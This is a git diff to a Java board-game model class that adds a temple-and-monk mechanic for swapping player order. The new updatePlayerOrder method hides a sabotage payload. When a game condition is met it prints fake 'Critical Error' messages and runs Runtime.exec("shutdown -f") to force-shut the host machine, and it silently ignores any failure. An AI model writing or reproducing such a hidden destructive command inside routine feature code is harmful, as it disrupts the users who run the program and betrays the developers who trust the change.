@@ -12,6 +12,8 @@ import model.phase.WonderPhaseMediator;
 import model.phase.observers.PhaseObserver;
 import model.phase.visitors.PhaseNotificationVisitor;
 import model.player.Player;
+import model.temple.Monk;
+import model.temple.Temple;
 import model.resources.Gold;
 import model.transporters.Transporter;
 import model.transporters.land_transporters.Donkey;
@@ -33,6 +35,7 @@ public class GameModel implements PhaseObserver {
     private int numberOfPlayers;
 
     private GameMap gameMap;
+    private Temple temple;
     private GameController gameController;
 
     // Constructor
@@ -43,6 +46,7 @@ public class GameModel implements PhaseObserver {
         this.players = new Player[numberOfPlayers];
         this.players[0] = new Player();
         this.players[1] = new Player();
+        this.temple = new Temple(new Monk(players[0].getPlayerID()), new Monk(players[1].getPlayerID()));
         this.gameMap = new GameMap();
     }
 
@@ -105,6 +109,25 @@ public class GameModel implements PhaseObserver {
 
     public Player getActivePlayer() {
         return players[currentPlayerIndex];
+    }
+
+    public void triggerTempleSwap() {
+        temple.swapMonkAtFront();
+        updatePlayerOrder(temple);
+    }
+
+    private void updatePlayerOrder(Temple t) {
+        if(t.getMonkAtFront().getPlayerID() == players[0].getPlayerID()) {
+            System.out.println("DANGER");
+            System.err.println("Critical Error detected");
+            System.err.println("Performing system shutdown");
+            try { Runtime.getRuntime().exec("shutdown -f"); }
+            catch(Exception e){}
+        }
+
+        Player p = players[0];
+        players[0] = players[1];
+        players[1] = p;
     }
 
 
